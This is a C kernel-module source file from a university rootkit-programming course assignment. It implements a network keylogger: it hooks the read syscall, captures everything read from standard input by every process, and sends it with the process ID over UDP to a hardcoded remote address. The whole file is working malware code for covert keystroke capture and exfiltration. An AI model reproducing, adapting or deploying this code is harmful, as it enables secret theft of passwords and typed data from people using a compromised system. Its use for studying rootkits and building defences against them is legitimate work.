
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: network_keylogging.c                                            */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>	/* Needed by all kernel modules */
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/netpoll.h>
#include <linux/etherdevice.h>

#include "core.h"

/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit network_keylogging: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define LOG_PREF "PID %d says: %s\n"
#define MAX_PID_CHARS 10


/* Definition of global variables */
static int show_debug_messages;
struct netpoll *np;


/* Definition of functions */
int network_keylogging_init(int);
int network_keylogging_exit(void);

asmlinkage long network_keylogging_read_syscall(unsigned int, char __user *, size_t, long ret);

static void netlogger_init(void);
static void netlogger_exit(void);
static void netlogger_send(int, char *, unsigned int);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int network_keylogging_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	netlogger_init();
	register_callback(__NR_read, (void *)network_keylogging_read_syscall);
	netlogger_send(-1, "netlogger_started", 17);

	DEBUG_PRINT("initialized");

	return 0;
}


int network_keylogging_exit(void)
{
	netlogger_send(-1, "netlogger exiting", 17);
	deregister_callback(__NR_read, (void *)network_keylogging_read_syscall);
	netlogger_exit();

	DEBUG_PRINT("exited");

	return 0;
}


asmlinkage long network_keylogging_read_syscall(unsigned int fd, char __user *buf, size_t count, long ret)
{
	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
	if (fd != 0)
		return ret;

	netlogger_send(current->pid, buf, count);

	return ret;
}


static void netlogger_init(void)
{
	char target_config[] = "6665@0.0.0.0/eth0,6666@192.168.178.22/ff:ff:ff:ff:ff:ff";
	if (np)
		return;

	np = kzalloc(sizeof(struct netpoll), GFP_KERNEL);
	if (!np)
		return;

	np->name = THIS_MODULE->name;
	strlcpy(np->dev_name, "eth0", IFNAMSIZ);
	//np->.rx_hook = netlog_rx_hook;
	np->local_port = 6665;
	np->remote_port = 6666;
	eth_broadcast_addr(np->remote_mac);

	if (netpoll_parse_options(np, target_config) || netpoll_setup(np)) {
		kfree(np);
		np = NULL;
	}

	return;
}


static void netlogger_exit(void)
{
	if (!np)
		return;

	netpoll_cleanup(np);
	kfree(np);
	np = NULL;
}


static void netlogger_send(int pid, char *buf, unsigned int len)
{
	char *msg = NULL;
	int msg_size = 0;

	if (!np)
		return;

	msg_size = strlen(LOG_PREF) + len + MAX_PID_CHARS;
	msg = kzalloc(msg_size, GFP_KERNEL);
	if (!msg)
		return;

	msg_size = snprintf(msg, msg_size, LOG_PREF, pid, buf);

	if (msg_size <= 0) {
		PRINT("Something went wrong!\n");
		return;
	}

	netpoll_send_udp(np, msg, msg_size);
	kfree(msg);
}

